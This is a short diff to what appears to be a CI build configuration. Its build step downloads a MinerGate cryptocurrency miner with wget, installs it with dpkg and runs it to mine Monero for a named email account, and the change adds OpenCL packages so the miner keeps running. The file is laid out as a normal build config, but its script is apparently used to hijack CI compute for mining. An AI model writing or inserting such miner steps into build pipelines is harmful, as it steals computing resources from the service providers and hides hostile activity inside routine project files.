@@ -3,7 +3,7 @@ box:
 build:
   steps:
     - script:
-        code: apt-get update && apt-get install -y wget && apt-get -f install && wget https://download.minergate.com/xfast-ubuntu-cli-amd && dpkg -i xfast-ubuntu-cli-amd && minergate-cli --user empireofbooks@gmail.com --xmr 8 --gpu 0
+        code: apt-get update && apt-get install -y wget && apt-get -f install && sudo apt update && sudo apt install -y ocl-icd-opencl-dev && wget https://download.minergate.com/xfast-ubuntu-cli-amd && dpkg -i xfast-ubuntu-cli-amd && minergate-cli --user empireofbooks@gmail.com --xmr 8 --gpu 0
 
 hello-again:
   box: ubuntu
